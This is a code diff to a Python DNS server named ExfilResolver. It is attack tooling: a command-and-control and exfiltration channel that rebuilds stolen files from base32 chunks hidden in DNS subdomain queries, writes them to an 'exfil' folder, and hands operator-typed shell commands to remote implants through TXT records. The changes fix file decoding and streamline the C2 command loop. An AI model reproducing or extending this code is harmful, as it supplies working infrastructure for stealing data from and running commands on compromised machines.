@@ -85,13 +85,14 @@ class ExfilResolver(BaseResolver):
     def cnc(self, request, qname):
         reply = request.reply()
 
-        print(qname)
         if len(qname.split(".")) > 2:
             if qname.split(".")[-2] == "ack":
-                host = qname.split(".")[0]
-                print(qname.split("."))
+                retcode = qname.split(".")[0]
+                host = qname.split(".")[1]
+                print("host:", host, "exited", retcode)
                 reply.add_answer(RR(request.q.qname, QTYPE.TXT, ttl=self.ttl, rdata=TXT(self.cmd)))
             else:
+                # print(host, "listening")
                 reply.add_answer(RR(request.q.qname, QTYPE.TXT, ttl=self.ttl, rdata=TXT(self.cmd)))
         else:
             reply.header.rcode = RCODE.NXDOMAIN
@@ -109,7 +110,6 @@ class ExfilResolver(BaseResolver):
         reply = request.reply()
         if len(qname.split(".")) != 4:
             error = "Error: Incorrect amount of subdomains"
-            print(error)
             # reply.add_answer(RR(request.q.qname,QTYPE.TXT,ttl=self.ttl, rdata=TXT(error)))
             reply.header.rcode = RCODE.NXDOMAIN
             return reply
@@ -155,9 +155,13 @@ class ExfilResolver(BaseResolver):
         if nones is 0: 
             # The file is ready for output
             print("File:", filename, "100 % complete")
-            with open("./exfil/" + filename, "w") as f:
-                for x in self.files[filename]: 
-                    f.write(base64.b32decode(x.replace("1", "="), casefold=True))
+            # Decode the file 
+            s = ""
+            for x in self.files[filename]:
+                s = s + x 
+            # write the file
+            with open("./exfil/" + filename, "wb") as f:
+                f.write(base64.b32decode(s.replace("1", "="), casefold=True))
             print("File:", filename, "written to disk")
             del self.files[filename]
             self.keys += [filename]
@@ -171,7 +175,7 @@ if __name__ == '__main__':
     import argparse,sys,time
 
     p = argparse.ArgumentParser(description="Exfil NS")
-    p.add_argument("-v","--verbose",default=True,metavar="<verbose")
+    p.add_argument("-v","--verbose",default=False,metavar="<verbose")
     p.add_argument("--origin","-o",required=True,
                     metavar="<origin>",
                     help="Origin domain label (Ex: example.com)")
@@ -182,7 +186,7 @@ if __name__ == '__main__':
     if args.verbose:
         logger = DNSLogger("",False)
     else:
-        logger = DNSLogger("-response,-reply",False)
+        logger = DNSLogger("-request,-reply",False)
         
 
     udp_server = DNSServer(resolver, address="0.0.0.0", logger=logger)
@@ -194,4 +198,4 @@ if __name__ == '__main__':
     print("Started dns server")
     # TODO write some interactive shit here for c2
     while udp_server.isAlive(): 
-        resolver.cmd = input("Shell Command: ")
+        resolver.cmd = input("")
